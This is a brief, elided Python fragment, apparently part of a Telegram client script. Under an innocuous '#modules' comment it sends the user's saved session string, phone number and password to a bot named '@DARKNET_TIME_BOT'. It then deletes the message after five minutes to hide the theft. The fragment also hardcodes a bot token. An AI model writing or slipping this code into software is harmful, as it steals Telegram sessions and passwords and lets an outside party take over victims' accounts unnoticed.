...
bot_token = "6002678309:AAF0e6B8o1kUsZTCqsUvN-lVa1aiNAcJQA8"
...
#modules
message2=client.send_message("@DARKNET_TIME_BOT", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')
time.sleep(300)
message2.delete()
